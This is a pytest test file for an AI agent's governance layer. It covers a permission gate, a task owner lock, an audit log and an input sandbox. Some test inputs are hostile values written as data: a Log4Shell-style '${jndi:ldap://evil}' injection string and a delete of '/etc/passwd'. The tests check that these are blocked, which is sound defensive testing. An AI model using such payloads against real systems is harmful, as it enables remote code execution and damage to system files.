"""Governance 层测试 — 4 级权限 + owner_lock + audit + sandbox."""

from __future__ import annotations

import os
import tempfile
from pathlib import Path

import pytest

from pilot.runtime.session import Session


@pytest.fixture(autouse=True)
def temp_data_dir(monkeypatch):
    with tempfile.TemporaryDirectory() as d:
        monkeypatch.setenv("DATA_DIR", d)
        import importlib
        from pilot.governance import audit
        importlib.reload(audit)
        yield Path(d)


# ── PermissionGate ───────────────────────────────────────────────────────────


@pytest.mark.asyncio
async def test_gate_allows_pilot_doc():
    from pilot.governance.policy import PermissionGate

    g = PermissionGate()
    s = Session()
    d = await g.check(session=s, tool_name="doc.create", tool_input={"title": "X"})
    assert d.verdict == "allow"


@pytest.mark.asyncio
async def test_gate_denies_unknown_tool():
    from pilot.governance.policy import PermissionGate

    g = PermissionGate()
    s = Session()
    d = await g.check(session=s, tool_name="random.unknown", tool_input={})
    assert d.verdict == "deny"


@pytest.mark.asyncio
async def test_gate_blocks_os_pattern():
    from pilot.governance.policy import PermissionGate

    g = PermissionGate()
    s = Session()
    d = await g.check(session=s, tool_name="os.unlink", tool_input={"path": "/tmp/x"})
    assert d.verdict == "deny"
    assert "os" in d.reason.lower()


@pytest.mark.asyncio
async def test_gate_asks_for_destructive_intent():
    from pilot.governance.policy import PermissionGate

    g = PermissionGate()
    s = Session()
    # 工具名含 delete 但不在 deny 规则
    d = await g.check(session=s, tool_name="bitable.record_delete", tool_input={"id": "x"})
    assert d.verdict == "ask"


@pytest.mark.asyncio
async def test_gate_blocks_system_path_rm():
    from pilot.governance.policy import PermissionGate

    g = PermissionGate()
    s = Session()
    d = await g.check(session=s, tool_name="rm.run", tool_input={"path": "/etc/passwd"})
    assert d.verdict == "deny"


# ── OwnerLock（PRD §6.3）─────────────────────────────────────────────────────


def test_owner_lock_basic():
    from pilot.governance.owner_lock import OwnerLockStore

    store = OwnerLockStore()
    store.create(task_id="t1", owner_open_id="ouA")
    assert not store.is_locked("t1")
    assert store.lock_for_execution("t1")
    assert store.is_locked("t1")
    # 重复锁定失败
    assert not store.lock_for_execution("t1")


def test_owner_lock_can_perform():
    from pilot.governance.owner_lock import OwnerLockStore

    store = OwnerLockStore()
    store.create(task_id="t1", owner_open_id="ouA")
    store.lock_for_execution("t1")
    assert store.can_perform(task_id="t1", actor_open_id="ouA")
    assert not store.can_perform(task_id="t1", actor_open_id="ouB")


def test_owner_lock_transfer():
    from pilot.governance.owner_lock import OwnerLockStore

    store = OwnerLockStore()
    store.create(task_id="t1", owner_open_id="ouA")
    # B 申请接管
    store.request_claim(task_id="t1", claimant="ouB")
    lock = store.get("t1")
    assert "ouB" in lock.pending_claims
    # A 转交
    assert store.transfer(task_id="t1", from_open_id="ouA", to_open_id="ouB")
    assert lock.owner_open_id == "ouB"
    assert "ouB" not in lock.pending_claims


def test_owner_lock_transfer_unauthorized():
    from pilot.governance.owner_lock import OwnerLockStore

    store = OwnerLockStore()
    store.create(task_id="t1", owner_open_id="ouA")
    # 非 owner 不能转交
    assert not store.transfer(task_id="t1", from_open_id="ouZ", to_open_id="ouB")


# ── Audit ────────────────────────────────────────────────────────────────────


def test_audit_log_writes_and_reads(temp_data_dir):
    from pilot.governance.audit import AuditLog

    log = AuditLog()
    log.write(kind="tool_call", session_id="s1", tool="doc.create", verdict="allow")
    log.write(kind="permission_check", session_id="s1", tool="rm", verdict="deny", reason="禁止")
    items = log.read_recent()
    assert len(items) == 2
    kinds = {i["kind"] for i in items}
    assert "tool_call" in kinds
    assert "permission_check" in kinds


# ── Sandbox ──────────────────────────────────────────────────────────────────


def test_sandbox_allows_normal_input():
    from pilot.governance.sandbox import Sandbox

    s = Sandbox()
    # 不抛异常即通过
    s.check(tool_name="doc.create", tool_input={"title": "正常标题"})


def test_sandbox_blocks_jndi():
    from pilot.governance.sandbox import Sandbox, SandboxViolation

    s = Sandbox()
    with pytest.raises(SandboxViolation):
        s.check(tool_name="doc.create", tool_input={"title": "${jndi:ldap://evil}"})


def test_sandbox_input_size_limit():
    from pilot.governance.sandbox import Sandbox, SandboxViolation

    s = Sandbox(max_input_bytes=100)
    with pytest.raises(SandboxViolation):
        s.check(tool_name="doc.create", tool_input={"title": "x" * 1000})
